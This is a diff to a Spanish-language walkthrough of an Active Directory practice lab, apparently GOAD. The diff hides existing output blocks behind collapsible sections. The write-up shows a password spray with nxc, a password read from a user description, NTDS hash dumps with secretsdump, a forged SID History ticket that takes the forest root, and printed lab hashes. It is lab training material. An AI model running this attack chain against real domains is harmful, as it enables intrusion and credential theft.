@@ -68,9 +68,14 @@ Un password spray trivial — cada usuario contra su propio nombre como contrase
 nxc smb 10.6.6.11 -u north_users.txt -p north_users.txt --no-bruteforce --continue-on-success
 ```
 
+<details markdown="1">
+<summary>🔓 Ver credencial encontrada</summary>
+
 ```
 [+] north.sevenkingdoms.local\hodor:hodor
 ```
+
+</details>
 
 `hodor` va a ser `hodor` hasta el final.
 
@@ -84,16 +89,29 @@ Con `hodor:hodor` ya se puede leer `NETLOGON`/`SYSVOL` por SMB, y lanzar un mód
 nxc ldap 10.6.6.11 -u hodor -p hodor -M get-desc-users
 ```
 
+<details markdown="1">
+<summary>🔓 Ver descripción filtrada</summary>
+
 ```
 User: samwell.tarly   description: Samwell Tarly (Password : Heartsbane)
 ```
+
+</details>
 
 Ahí está — la contraseña de `samwell.tarly` escrita en texto plano en su propia descripción de AD. Confirmación:
 
 ```bash
 nxc smb 10.6.6.11 -u samwell.tarly -p Heartsbane
-# [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane
 ```
+
+<details markdown="1">
+<summary>🔓 Ver resultado</summary>
+
+```
+[+] north.sevenkingdoms.local\samwell.tarly:Heartsbane
+```
+
+</details>
 
 ---
 
@@ -150,9 +168,15 @@ Con admin en `winterfell`, `secretsdump` completo saca la NTDS del dominio hijo 
 secretsdump.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10.6.6.11
 ```
 
+<details markdown="1">
+<summary>🔓 Ver hashes volcados de winterfell</summary>
+
 ```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 NORTH$:1105:aad3b435b51404eeaad3b435b51404ee:aaed1f8c12a6ff5b76a1903124b7363b:::
 ```
+
+</details>
 
 `NORTH$` es la cuenta de confianza que representa al dominio hijo dentro del bosque — y su NTLM es la clave para el ataque clásico de **SID History / confianza padre-hijo**. Con [ticketer.py](https://github.com/fortra/impacket) se forja un TGT para "Administrator" del dominio hijo, pero inyectando en el campo `SID History` el SID de **Enterprise Admins del dominio raíz** (`<SID-raíz>-519`):
 
@@ -173,6 +197,9 @@ secretsdump.py -k -no-pass north.sevenkingdoms.local/Administrator@kingslanding.
 
 Y ahí cae el dominio raíz completo:
 
+<details markdown="1">
+<summary>🔓 Ver NTDS completo de kingslanding</summary>
+
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5690a1ca2f11b3fce0f6e84e57c6da99:::
@@ -183,6 +210,8 @@ tyron.lannister:1116:...
 robert.baratheon:1117:...
 ...
 ```
+
+</details>
 
 Con el hash de `krbtgt` del dominio raíz en la mano, se puede forjar un Golden Ticket permanente para todo `sevenkingdoms.local`. Dominio raíz del bosque comprometido de principio a fin, partiendo de una cuenta cuya contraseña era literalmente su propio nombre.
 
